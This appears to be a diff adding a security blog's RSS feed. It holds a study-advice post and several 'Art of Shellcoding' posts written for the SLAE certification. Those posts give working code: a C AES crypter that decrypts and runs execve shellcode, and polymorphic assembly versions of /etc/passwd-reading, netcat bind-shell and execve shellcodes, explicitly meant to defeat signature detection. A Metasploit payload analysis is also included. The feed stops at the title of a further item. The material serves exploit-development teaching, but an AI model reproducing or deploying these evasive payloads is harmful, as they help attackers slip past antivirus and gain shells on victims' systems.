@@ -1,0 +1,2974 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on VAPT.IO - Home of the Next Gen Cyber Ninja</title>
+        <link>/posts/</link>
+        <description>Recent content in Posts on VAPT.IO - Home of the Next Gen Cyber Ninja</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Sun, 26 Aug 2018 16:53:00 +0530</lastBuildDate>
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Subjects that Help Building Cyber Security Skills while you are Studying</title>
+            <link>/posts/2018/08/subjects-that-help-building-cyber-security-skills-while-you-are-studying/</link>
+            <pubDate>Sun, 26 Aug 2018 16:53:00 +0530</pubDate>
+            
+            <guid>/posts/2018/08/subjects-that-help-building-cyber-security-skills-while-you-are-studying/</guid>
+            <description>Whats up guys eh, long time and i haven&amp;rsquo;t posted anything recently. Yeah i know i have been busy with a ton of work at the company where we have been doing something amazing almost every day. Recently, we have been working on various cutting-edge vulnerability research and product development projects and my end of the day is like never-ending. Anyways, there have been many students asking me one common question every time i login to facebook or any other social media that &amp;ldquo;I am a B.</description>
+            <content type="html"><![CDATA[<p>Whats up guys eh, long time and i haven&rsquo;t posted anything recently. Yeah
+i know i have been busy with a ton of work at the company where we have
+been doing something amazing almost every day. Recently, we have been
+working on various cutting-edge vulnerability research and product
+development projects and my end of the day is like never-ending.
+Anyways, there have been many students asking me one common question
+every time i login to facebook or any other social media that &ldquo;<strong>I am a
+B.tech/BCA/MCA/B. Sc IT student and to focus more on cybersecurity,
+which subjects i should focus on</strong>&rdquo;. Well, your parents would say every
+subject :P, but some of the subjects do stand out from the crowd. Like i
+have always mentioned in my previous talks, articles that <strong>C</strong> is the
+mother of all programming languages, you should always keep <strong>C</strong> in the
+prime focus when it comes to programming. For those who suck at C or
+programming entirely, i am afraid that you may become a cybersecurity
+professional knowing nothing behind the picture and it will bite you
+someday or the other. </p>
+
+<p>Well, there are two kinds of people in the cyber security industry,
+especially on the low profile jobs, ones who are dedicated, committed
+and research oriented, those who will try every possible way to attack
+the application or any stack by finding vulnerabilities, logical flaws
+etc and there is a completely different lot as well.
+<p align="center">
+<img src="/images/2018-08-26-subjects-that-help-building-cyber-security-skills-while-you-are-studying-2010012825102272.jpg" alt="alt text" />
+</p></p>
+
+<p>There is a unique bunch of people who are dedicated, committed but are
+more of <strong>&ldquo;Bots&rdquo;</strong>. Well sometimes bots can be cool, but they are
+generally hired to do only a single job that is to click some of the
+buttons on a vulnerability scanner. Well, the people i mentioned earlier
+(the one&rsquo;s who suck at programming) are excellent candidates for Bots
+since they are paid for clicking few buttons a month, it sounds really
+easy. However, easy is sometimes dull. A dedicated cybersecurity
+professional can never be boring, he wakes up to a new challenge every
+single day. Yet, to change your fate from becoming a life sized bot, the
+changes have to be done in the past and especially at the level where
+you are still developing skills. Hence, it is essential to know what&rsquo;s
+important and what&rsquo;s not, which subjects to focus precisely. Therefore,
+let me list down some of the critical subjects and the skills they will
+help you with if you focus more on them. We will be starting with the
+very primary subjects:</p>
+
+<ol>
+<li><strong>C/CPP Programming</strong>: Must for Everyone, developers, exploit
+researchers, pen-testers for logics etc.</li>
+<li><strong>Data Structures</strong>: Must for Exploit researchers especially in Heap
+overflow bugs, doubly linked list concepts help you out a lot. May
+not be that important for pen-testers who limit their scope only to
+scanners</li>
+<li><strong>Operating System</strong>: Yes, the book in red and with dinosaurs&hellip;
+Important, Very important for researchers, developers, exploit
+developers because you get to know the insights of the operating
+system, get to know about processes and threads.</li>
+<li><strong>Computer Architecture</strong>: The most focused subject should be this
+one if you are planning exploit research or even if you are
+preparing for <strong>OSCP/OSCE</strong>. I frankly thought this subject is a
+pain, but i realised that if i would have put in a lil bit of the
+extra effort at the time i was studying,  I would have not have
+learnt Assembly and computer organisation again.</li>
+<li><strong>Automata Theory</strong>: Good for Researchers, developers</li>
+<li><strong>Computer Networks</strong>: Good for Researchers/ Developers /Exploit
+Developers/ Vulnerability Researchers, Pen-Testers etc.</li>
+<li><strong>Software Engineering</strong>: And the most boring subject of the century
+goes to&hellip; Anyways, though its boring, it will help you in learning
+the development stages, Models and plenty of other stuff. Mostly
+helpful for startup founders, solution researchers etc.</li>
+<li><strong>Artifical Intelligence/ Machine Learning</strong>: if these make a cut in
+your syllabus, you should be thankful to your college. AI and ML is
+a booming domain especially when combined with cybersecurity
+products. Mostly for everyone but especially for Developers (Cater
+to the current market)</li>
+<li><strong>Compiler Design</strong>: Good to know for developers and researchers,
+not too important for pen-testers</li>
+<li><strong>Cryptography</strong>: Aah&hellip; You know this right.. However, i strongly
+believe that this subject should also throw some light on the
+cryptanalysis. Essential for researchers, developers and CTF
+players.</li>
+<li> <strong>Wireless Sensor Networks</strong>: Yes, required for everyone especially
+in network pentesting, distributed solutions and much more</li>
+<li><strong>Computer Networks</strong>: Everyone should know this especially if you
+like playing with Hackrf, SDR etc. Why? Encodings&hellip; Modulation
+Types and much more</li>
+<li><strong>Add-Ons: Linux Programming</strong>: I am always thankful to LPU for
+putting this in my course material. This subject taught me SYSCALLS
+while i was studying.</li>
+<li><strong>Add-Ons: Visual Basic</strong>: I am grateful again to my university for
+putting this in.. i am able to develop a lot of security tools and
+malware due to this :P</li>
+<li><strong>Add-Ons: C#</strong>: Good to know and very important for developers
+especially when you hate Java.</li>
+<li><strong>Add-Ons: Java</strong>: I suck at Java!! Enough Said.. but for
+developers, app developers this is a must</li>
+<li><strong>Add-Ons: Python</strong>: Oh Yeah!! This is the best thing that can
+happen to you.</li>
+<li><strong>Add-Ons: Cyber Security</strong>: If you failed to select this on time,
+that would be sad&hellip;</li>
+<li><strong>Add-Ons:</strong> a lot of self-study, don&rsquo;t spend unnecessarily on
+Courses, learn from practical exposure such as Hack in the Box,
+VulnHub etc.</li>
+<li><strong>Add-Ons: Attendance</strong>: You would learn all of the above if you
+will be present in the class.</li>
+<li><strong>The Most Important: Patience</strong>: Dont cram, try to learn. Dont go
+for cyber security if you think your friend has done it and so
+should you. Fall in love with it first.</li>
+</ol>
+
+<p>Hope this helps and answers your questions. Yes, there are a ton of
+courses online and available freely as well which will aid your learning
+process. Don&rsquo;t just be in the cybersecurity field for the job, be in the
+job because you know cyber security. I am happy that after completing my
+M.tech i am working in an area where my hobby changed to my profession
+and it feels like i am never working :) Post your queries in the
+comments if you think i left something out. Thanks</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding: Basic AES Shellcode Crypter</title>
+            <link>/posts/2018/02/art-of-shellcoding-basic-aes-shellcode-crypter/</link>
+            <pubDate>Wed, 28 Feb 2018 17:37:00 +0530</pubDate>
+            
+            <guid>/posts/2018/02/art-of-shellcoding-basic-aes-shellcode-crypter/</guid>
+            <description>In this post, we will design a shellcode crypter which will encrypt the shellcode and then decrypt the encrypted shellcode and run it dynamically. The libraries we will be using for encryption will be mcrypt, and the shellcode encryption schema is Rijndael-128(AES).  We will design the crypter in C programming language. The shellcode we will be using for this exercise will be an execve stack based shellcode. Following is the code of the crypter:</description>
+            <content type="html"><![CDATA[<p>In this post, we will design a shellcode crypter which will encrypt the
+shellcode and then decrypt the encrypted shellcode and run it
+dynamically. The libraries we will be using for encryption will be
+<code>mcrypt</code>, and the shellcode encryption schema is Rijndael-128(AES). 
+<p align="center">
+<a href="/images/2018-02-28-art-of-shellcoding-basic-aes-shellcode-crypter-security-aes_design_desktop.jpg"><img src="/images/thumbnails/2018-02-28-art-of-shellcoding-basic-aes-shellcode-crypter-security-aes_design_desktop.jpg" alt="" /></a>
+</p></p>
+
+<p>We will design the crypter in C programming language. The shellcode we
+will be using for this exercise will be an execve stack based shellcode.
+Following is the code of the crypter:</p>
+
+<pre><code>/*
+Compile using the following command:
+$gcc aes_128_crypter.c -o aes_128_crypter -lmcrypt -fno-stack-protector -z execstack
+Author: Nipun Jaswal (SLAE-1080)
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;mcrypt.h&gt;
+
+int main()
+{
+// Shellcode execve-stack
+unsigned char * shellcode = \
+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
+&quot;\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89&quot;
+&quot;\xe1\xb0\x0b\xcd\x80&quot;;
+int shell_len = strlen(shellcode);
+
+// Other Variables
+char* i_vect = &quot;AAAABBBBCCCCDDDD&quot;;
+char *key = &quot;wh4t1sloven0t1ng&quot;;
+unsigned char buffer[32];
+int count;
+
+// Printing Unencrypted Shellcode
+printf(&quot;\n[+] Shellcode Used:\n&quot;);
+for ( count = 0; count &lt; shell_len; count++)
+{
+printf(&quot;\\x%02x&quot;,shellcode[count]);
+}
+
+//Copy Shellcode on a 32 Byte Buffer
+strncpy(buffer, shellcode, 32);
+
+//Calling Encryption Function with Flag=0 , 32 is Length, 16 is Key Size
+enc_dec(buffer, 32, i_vect, key,0);
+
+//Printing Out Encrypted Shellcode Bytes
+printf(&quot;\n\n[+] Encrypted Shellcode:\n&quot;);
+for ( count = 0; count &lt; 32; count++)
+{
+printf(&quot;\\x%02x&quot;,buffer[count]);
+}
+
+//Calling Decryption Function with Flag=1, 32 is the Length, 16 is Key Size
+enc_dec(buffer, 32, i_vect, key,1);
+
+//Printing Out Decrypted Shellcode Bytes
+printf(&quot;\n\n[+] Decrypted Shellcode:\n&quot;);
+for(count = 0; count &lt; shell_len; count++)
+{
+printf(&quot;\\x%02x&quot;,buffer[count]);
+}
+
+//Calling Shellcode
+printf(&quot;\n\nShellcode Length:  %d\n&quot;, strlen(buffer));
+int (*ret)() = (int(*)())buffer;
+ret();
+return 0;
+}
+// Encryption Function
+int enc_dec(void* buffer,int buffer_len,char* i_vect, char* key, int flag)
+{
+  // Mcrypt Object and Selecting the Crypto
+  MCRYPT obj = mcrypt_module_open(&quot;rijndael-128&quot;, NULL, &quot;cbc&quot;, NULL);
+  mcrypt_generic_init(obj, key, 16, i_vect);
+  if(flag==0)
+  {
+  printf(&quot;\n\n[+]Running Encryption...&quot;);
+  //Encrypting the Shellcode
+  mcrypt_generic(obj, buffer, buffer_len);
+  }
+  else if(flag==1)
+  {
+  printf(&quot;\n\n[+]Running Decryption...&quot;);
+  //Decrypting the Shellcode
+  mdecrypt_generic(obj, buffer, buffer_len);
+  }
+  mcrypt_generic_deinit (obj);
+  mcrypt_module_close(obj);
+  return 0;
+}
+</code></pre>
+
+<p>The <code>enc_dec</code> function accepts flag value and based on the value it
+performs either an encryption operation or decryption operation. Also,
+the length of the key for encryption and decryption is 16. On running the
+crypter, we get the following output:</p>
+
+<p><a href="/images/2018-02-28-art-of-shellcoding-basic-aes-shellcode-crypter-Screenshot_1.png"><img src="/images/2018-02-28-art-of-shellcoding-basic-aes-shellcode-crypter-Screenshot_1.png" alt="" /></a></p>
+
+<p>We saw how we can create a basic crypter in C. We can build on these
+methods and combine the best of polymorphism, encoding, and encryption
+to create much more advanced and detection free shellcodes.</p>
+
+<p><span
+style="background: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span></p>
+
+<p><span
+style="background: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span
+style="background: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding: Polymorphic Shellcodes</title>
+            <link>/posts/2018/02/art-of-shellcoding-polymorphic-shellcodes/</link>
+            <pubDate>Wed, 28 Feb 2018 15:01:00 +0530</pubDate>
+            
+            <guid>/posts/2018/02/art-of-shellcoding-polymorphic-shellcodes/</guid>
+            <description>Polymorphic shellcodes help defeat pattern matching. A great shellcode will combine not only the polymorphism in the shellcode but will combine a variety of techniques including encoding, encryption, and polymorphism. In this post, we will take up 3 different shellcodes and will convert them into the polymorphic ones. A polymorphic shellcode will not differ in the functionality, but we will use a variety of other instructions. This means that polymorphism is nothing but doing the same thing using a variety of different instructions.</description>
+            <content type="html"><![CDATA[
+
+<p>Polymorphic shellcodes help defeat pattern matching. A great shellcode
+will combine not only the polymorphism in the shellcode but will combine
+a variety of techniques including encoding, encryption, and
+polymorphism. In this post, we will take up 3 different shellcodes and
+will convert them into the polymorphic ones. A polymorphic shellcode
+will not differ in the functionality, but we will use a variety of other
+instructions. This means that polymorphism is nothing but doing the same
+thing using a variety of different instructions.</p>
+
+<h2 id="bin-cat-etc-passwd-shellcode">/bin/cat /etc/passwd Shellcode </h2>
+
+<p>The first payload we will be using is
+from <a href="http://shell-storm.org/shellcode/files/shellcode-571.php" target="_blank">http://shell-storm.org/shellcode/files/shellcode-571.php</a> . This
+shellcode is a simple /bin/cat shellcode and will display the contents
+of /etc/passwd file. The code is as follows:</p>
+
+<pre><code>; Polymorphic Version of /bin/cat Shellcode from http://shell-storm.org/shellcode/files/shellcode-571.php
+; Author: Nipun Jaswal
+
+global _start
+section .text
+
+_start:
+;   xor eax,eax
+    xor ecx,ecx				; Clearing out ECX
+
+;   cdq
+    mul ecx				    ; Clearing EAX
+
+;   push edx
+    push eax
+;   mov dword [esp-4], ecx	; Moving ECX to the TOP of the Stack
+;   sub esp,4				; Stack Adjustment
+
+    mov esi, 0x523e3f0a		; Actual Value - 22232425
+    add esi, 0x22232425		; Adding the Value
+    push esi				; Push Operation
+;   push dword 0x7461632f
+
+    inc esi				    ; Avoiding Null Byte
+    sub esi, 0x05f80101		; Adjusting Second Value
+    push esi				; Push Operation
+;   push dword 0x6e69622f
+    mov ebx, esp
+
+    push ecx
+    sub esi, 0x09f1eebc		; Re-Using ESI, Beating Pattern Matching
+    push esi
+;   push  0x64777373
+
+    sub esi, 0x03074444		; Re-Using ESI, Beating Pattern Matching
+    push esi
+;   push 0x61702f2f
+
+    add esi, 0x02043601		; Re-Using ESI, Beating Pattern Matching
+    dec esi				    ; Avoiding Null Byte
+    push esi
+;   push 0x6374652f
+					        ; Unchanged Section
+    mov ecx, esp
+    mov al, 0xb
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80
+</code></pre>
+
+<p>We have commented out instructions from the original code and replaced
+it with a different set of instructions. We made use of ESI register
+instead of pushing the string directly onto the stack and performed an
+ADD operation to get the same value which was pushed in the original
+shellcode. To avoid null values we incremented ESI and performed
+subtract operation to get the second same value being pushed in the
+original shellcode.</p>
+
+<p>Throughout the shellcode, we made use of <strong>ADD, SUB, INC &amp; DEC</strong>
+instructions to completely defeat pattern matching. On compiling and
+Running the code, we get the following output:</p>
+
+<p><a href="/images/2018-02-28-art-of-shellcoding-polymorphic-shellcodes-Screenshot2018-02-2813.38.08.png"><img src="/images/2018-02-28-art-of-shellcoding-polymorphic-shellcodes-Screenshot2018-02-2813.38.08.png" alt="" /></a></p>
+
+<p><strong>Original Payload Length:</strong> <strong>43 Bytes</strong>
+<strong>Polymorphic Version Length:</strong> <strong>61 Bytes</strong>
+<strong>Change %age :</strong> <strong><span style="color: lime;">41% Increase</span></strong></p>
+
+<h2 id="netcat-bind-tcp-shellcode">Netcat Bind TCP Shellcode</h2>
+
+<p>The next shellcode is a netcat bind TCP shellcode which allows you to
+connect to the port 17771 and presents a system shell. The original
+Shellcode can be downloaded
+from  <a href="http://shell-storm.org/shellcode/files/shellcode-872.php" target="_blank">http://shell-storm.org/shellcode/files/shellcode-872.php</a> and is
+58 bytes in length. Using the similar approach we took for the previous
+shellcode, let see what a polymorphic version of the shellcode looks
+like:</p>
+
+<pre><code>; http://shell-storm.org/shellcode/files/shellcode-872.php
+; Author: Nipun Jaswal (SLAE-1080)
+global _start
+section .text
+ _start:
+;   xor eax, eax
+    xor edx, edx	; Cleared EDX
+    mul edx		; Cleared EAX
+
+;   push eax
+    push edx		; EDX is Also Zero
+
+    mov esi, 0x30363636	; Instead of PUSH moved a Value to ESI
+    add esi, 0x01010101 ; Addition Operation to Get the Same Value i.e. 0x31373737
+    push esi		; Push Op
+    add esi, 0x21010101 ; Adding Random Value to ESI (Avoiding Null)
+    sub esi, 0x20c7c20b ; Getting Back the Same Value i.e. 0x3170762d
+    push esi		; Push Op
+;   push 0x31373737
+;   push 0x3170762d
+    mov esi, esp	; Moving ESP to ESI
+
+;   push eax
+    push edx		; EDX is also Zero
+
+    mov edi, 0x68732f30	; Incremented Value to EDI
+    dec edi		; Decrement the Value
+    push edi		; Push EDI
+    inc edi		; Incremented Again( Avoiding Null Byte)
+    add edi, 0x05F632FF	; Same as 0x6e69622f (Adjusting the Value For Next Push)
+    push edi 		; Value Pushed
+;   push 0x68732f2f     ;-le//bin//sh
+;   push 0x6e69622f
+    push 0x2f656c2d	; -le/ remains unmasked
+    mov edi, esp
+
+;   push eax
+    push edx		; EDX is same as EAX
+    mov edx,0x636e2f2e	; Decremented Value of EDX
+    inc edx		; Increment EDX
+    push edx		; Push EDX
+;   push 0x636e2f2f     ;/bin//nc
+
+    dec edx		; Back to the Original Value for Null Free OP
+    add edx, 0xafb3301	; Add Value to EDX
+    push edx
+;   push 0x6e69622f
+
+    mov ebx, esp
+    xor edx,edx		; Since we Used EDX above, Zeroing it Out Here
+    push eax
+    push esi
+    push edi
+    push ebx
+    mov ecx, esp
+;   mov al,11
+    mov al,12		; Incremented
+    dec eax		; Decrement
+    int 0x80
+</code></pre>
+
+<p>The code is pretty straightforward. However, we only replace
+instructions which are relevant to the signatures. We made use of ESI
+again as we did in the previous shellcode. However, we are also making
+use of EDI register as well.  On executing the shellcode:</p>
+
+<p><a href="/images/2018-02-28-art-of-shellcoding-polymorphic-shellcodes-Screenshot2018-02-2814.23.36.png"><img src="/images/2018-02-28-art-of-shellcoding-polymorphic-shellcodes-Screenshot2018-02-2814.23.36.png" alt="" /></a></p>
+
+<p><strong>Original Payload Length:</strong> <strong>58 Bytes</strong>
+<strong>Polymorphic Version Length:</strong> <strong>86 Bytes</strong>
+<strong>Change %age :</strong> <strong><span style="color: lime;">48% Increase</span></strong></p>
+
+<h2 id="execve-shellcode">Execve Shellcode</h2>
+
+<p>The last shellcode is execve shellcode
+from <a href="http://shell-storm.org/shellcode/files/shellcode-575.php" target="_blank">http://shell-storm.org/shellcode/files/shellcode-575.php</a> and is
+21 bytes in length. The shellcode does nothing much than popping up a
+shell locally. Let&rsquo;s make a polymorphic version of it as follows:</p>
+
+<pre><code>;http://shell-storm.org/shellcode/files/shellcode-575.php
+;Author: Nipun Jaswal (SLAE-1080)
+global _start
+section .text
+
+_start:
+	xchg esi, eax	; Zero to EAX
+	mov al, 0xb	; Mov Instead of PUSH
+	;push byte +0xb
+	;pop eax
+	;cdq
+	push ecx	; ECX is also Zero
+	;push edx
+	;push dword 0x68732f2f
+	mov esi, 0x68732f2f	; Value Moved to ESI
+	push esi		; Pushed onto the Stack
+	dec esi			; Value Decremented to Avoid NULL
+	add esi, 0x5F63301	; Added Value to Match Second Parameter
+	push esi		; Value Pushed
+	;push dword 0x6e69622f
+	mov ebx, esp		; Paramters to EBX
+	;xor ecx, ecx
+	int 0x80		; Interrupt
+</code></pre>
+
+<p>We used the same concepts like we did for the previous shellcodes.
+<strong>Original Payload Length:</strong> <strong>21 Bytes</strong>
+<strong>Polymorphic Version Length:</strong> <strong>22 Bytes</strong>
+<strong>Change %age :</strong> <strong><span style="color: lime;">0.4</span><span
+style="color: lime;">% Increase</span></strong>
+<strong><span style="color: lime;">
+</span></strong> On running the shellcode, we get the following output:</p>
+
+<p><a href="/images/2018-02-28-art-of-shellcoding-polymorphic-shellcodes-Screenshot2018-02-2814.41.42.png"><img src="/images/2018-02-28-art-of-shellcoding-polymorphic-shellcodes-Screenshot2018-02-2814.41.42.png" alt="" /></a></p>
+
+<p>Throughout this post, we saw that how a single operation can be done
+through a countless number of ways and making use of
+different instructions. In the next post, we will see how we can make
+our own crypter.</p>
+
+<p><span
+style="color: red; font-family: &quot;open sans&quot;, sans-serif; font-size: 15px;">
+</span><span
+style="color: red; font-family: &quot;open sans&quot;, sans-serif; font-size: 15px;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span></p>
+
+<p><span
+style="background-position: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background-position: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span
+style="background-position: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background-position: 0px 0px; border: 0px; color: red; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding: Metasploit Read File Payload Analysis</title>
+            <link>/posts/2018/02/art-of-shellcoding-metasploit-read-file-payload-analysis/</link>
+            <pubDate>Sat, 24 Feb 2018 02:16:00 +0530</pubDate>
+            
+            <guid>/posts/2018/02/art-of-shellcoding-metasploit-read-file-payload-analysis/</guid>
+            <description>Today, we will be looking at Metasploit&amp;rsquo;s linux/x86/read_file payload. In this post, we will uncover how this payload works internally when it tries to read the /etc/passwd file. We will use GDB-Peda for our analysis. Using msfvenom, i created a file, i.e., read. Elf and while i was generating the file i used PATH value as /etc/passwd.  Therefore, when the file is made to execute, it will read the contents of the /etc/passwd and will display it on the screen as shown in the following image:</description>
+            <content type="html"><![CDATA[<p>Today, we will be looking at Metasploit&rsquo;s linux/x86/read_file payload.
+In this post, we will uncover how this payload works internally when it
+tries to read the /etc/passwd file. We will use GDB-Peda for our
+analysis. Using msfvenom, i created a file, i.e., read. Elf and while i
+was generating the file i used PATH value as /etc/passwd. 
+<p align="center">
+<a href="/images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-search-file-analysis-graph-statistics-report-chart-marketing-business-finance-3254b663135eecf5-512x512.png"><img src="/images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-search-file-analysis-graph-statistics-report-chart-marketing-business-finance-3254b663135eecf5-512x512.png" alt="" /></a>
+</p></p>
+
+<p>Therefore, when the file is made to execute, it will read the contents
+of the /etc/passwd and will display it on the screen as shown in the
+following image:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.19.10.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.19.10.png" alt="" /></a></p>
+
+<p>Let&rsquo;s load this file into GDB-Peda, set a breakpoint on the
+shellcode(<em>using *&amp;shellcode</em>) and run the program.We are presented
+with the following screen:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.13.39.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.13.39.png" alt="" /></a></p>
+
+<p>   </p>
+
+<p>We can see that the very first instruction is a Jump statement. Taking
+the jump, we have the following instruction:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.13.57.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.13.57.png" alt="" /></a></p>
+
+<p>Taking the call instruction, we are presented with the following screen:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.14.04.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.14.04.png" alt="" /></a></p>
+
+<p>Looks like we finally arrived at the shellcode and the previous two
+statements were nothing but a JUMP-CALL sequence which would have pushed
+the hardcoded file path onto the stack. We can see that the stack
+contains /etc/passwd which is the path we defined in the shellcode.
+Nevertheless, the first instruction is to move 0x5 to EAX register.  The
+0x5 value denotes sys_open system call which follows the following
+format:</p>
+
+<p><strong>open(const char *</strong>*pathname*<strong>, int</strong> *flags*<strong>);</strong> </p>
+
+<p>The open call requires *pathname in the EBX register. So, the next
+instruction in the shellcode, which is, pop ebx not only completes the
+JUMP-CALL-POP sequence but sets the open system call perfectly. In the
+next instruction, ECX gets cleared out and now have a value 0 in it. A
+successful open should return the file descriptor in EAX register. Let&rsquo;s
+see:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.39.03.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.39.03.png" alt="" /></a></p>
+
+<p>We can see the descriptor in EAX. The next statement moves the
+descriptor to EBX. Next, EAX is loaded with 0x3 which is sys_read
+system call:</p>
+
+<pre><code>ssize_t read(int fd, void *buf, size_t count);
+</code></pre>
+
+<p>We can see that to setup read system call. EBX should be loaded with
+fd which is the file descriptor. However, EBX has already been set up
+using the previous instruction. The next instruction is to move the top
+of the stack to EDI, and in the next instruction, it is transferred to
+ECX which is the register to be set up for *buf. Finally, move 0x1000
+to EDX will move 0x1000 as the count. Let&rsquo;s see the next segment:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.47.30.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B01.47.30.png" alt="" /></a></p>
+
+<p>Next instruction will issue the interrupt for the read system call. In
+the next one, the result from EAX is moved to EDX. Next, 0x4 is moved to
+EAX which is nothing but syscall number for write system call. The value
+0x1 is moved to EBX which means that the output will be written to
+console.The ECX register is unaffected by the previous call and is not
+required to be set up again. Hence, the interrupt is issued:</p>
+
+<p><a href="../images/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B02.03.38.png"><img src="../images/thumbnails/2018-02-24-art-of-shellcoding-metasploit-read-file-payload-analysis-Screenshot%2B2018-02-24%2B02.03.38.png" alt="" /></a></p>
+
+<p>In the final segment of the code, The value 0x1 is moved to EAX which
+denotes an exit call. Additionally, 0x0 is moved to EBX as the
+error_code and interrupt is issued which will terminate the program.</p>
+
+<p>We saw that the shellcode works by opening the file using open call,
+reading it using read call and outputting the data onto the console
+using write system call and finally making an exit using the exit system
+call. Pretty Straightforward.</p>
+
+<p><span
+style="background: 0px 0px rgb(255, 255, 255); border: 0px; color: red; font-family: &quot;Open Sans&quot;, sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span>
+<span
+style="background: 0px 0px rgb(255, 255, 255); border: 0px; color: red; font-family: &quot;Open Sans&quot;, sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background: 0px 0px rgb(255, 255, 255); border: 0px; color: red; font-family: &quot;Open Sans&quot;, sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span
+style="background: 0px 0px rgb(255, 255, 255); border: 0px; color: red; font-family: &quot;Open Sans&quot;, sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background: 0px 0px rgb(255, 255, 255); border: 0px; color: red; font-family: &quot;Open Sans&quot;, sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of ShellCoding: Metasploit IPv6 Reverse TCP Shellcode Analysis</title>
+            <link>/posts/2018/02/art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis/</link>
+            <pubDate>Fri, 23 Feb 2018 00:24:00 +0530</pubDate>
+            
+            <guid>/posts/2018/02/art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis/</guid>
